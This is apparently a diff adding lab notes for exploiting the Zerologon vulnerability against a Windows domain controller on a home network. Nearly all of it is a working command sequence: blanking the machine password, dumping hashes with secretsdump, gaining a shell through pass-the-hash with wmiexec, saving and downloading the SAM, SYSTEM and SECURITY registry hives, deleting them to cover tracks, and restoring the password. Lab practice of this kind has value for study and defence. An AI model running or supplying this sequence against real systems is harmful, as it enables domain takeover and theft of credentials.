@@ -1,0 +1,94 @@
+KEY:
+====
+Windows commands start with: C:\>
+Linux commands start with: #
+
+
+change directory to the zerologon exploit folder:
+=================================================
+# cd ~/zerologon
+
+
+run the first script to exploit the machine:
+============================================
+this will set the password to an empty string
+ZEROLOGON-DC is the PC's name
+192.168.1.28 is the IP address it was assigned on my network
+
+# python3 set_empty_pw.py ZEROLOGON-DC 192.168.1.28
+
+look for:
+Success! DC should now have the empty string as its machine password.
+
+
+run the second script to dump the hashes:
+=========================================
+ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28
+<Domain> / <NETBIOS name (PC name)> \$@ <ip address of server we are attacking>
+# secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 ZEROLOGON/ZEROLOGON-DC\$@192.168.1.28
+
+looking for:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::
+
+
+run the third script to get terminal on victim machine:
+=======================================================
+ZEROLOGON/Administrator@192.168.1.28
+<Domain> / <user name> @ <ip address> -hashes <administrator hash>
+# wmiexec.py ZEROLOGON/Administrator@192.168.1.28 -hashes aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976
+
+Looking for:
+C:\>
+
+
+Commands to run once on victim machine:
+=======================================
+verify who you are logged in as:
+C:\>whoami
+zerologon\administrator
+
+verify the system you are logged into:
+C:\>hostname
+ZEROLOGON-DC
+
+Prep logon credentials for download:
+C:\>reg save HKLM\SYSTEM system.save
+The operation completed successfully.
+
+C:\>reg save HKLM\SAM sam.save
+The operation completed successfully.
+
+C:\>reg save HKLM\SECURITY security.save
+The operation completed successfully.
+
+Download logon credentials:
+C:\>get system.save
+[*] Downloading C:\\system.save
+
+C:\>get sam.save
+[*] Downloading C:\\sam.save
+
+C:\>get security.save
+[*] Downloading C:\\security.save
+
+Clean up:
+C:\>del /f system.save
+C:\>del /f sam.save
+C:\>del /f security.save
+
+
+Exit out and go back to Linux terminal: 
+=======================================
+# secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+
+Looking for:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:06ebd4bf3fa4fe306259c45e389dc976:::
+
+
+Restore the original password:
+==============================
+ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
+<pc name> <ip address> <admin hash>
+# python3 reinstall_original_pw.py ZEROLOGON-DC 192.168.1.28 aad3b435b51404eeaad3b435b51404ee:6d4a95ae230e5ce2c1dbfd780e340cbc
+
+
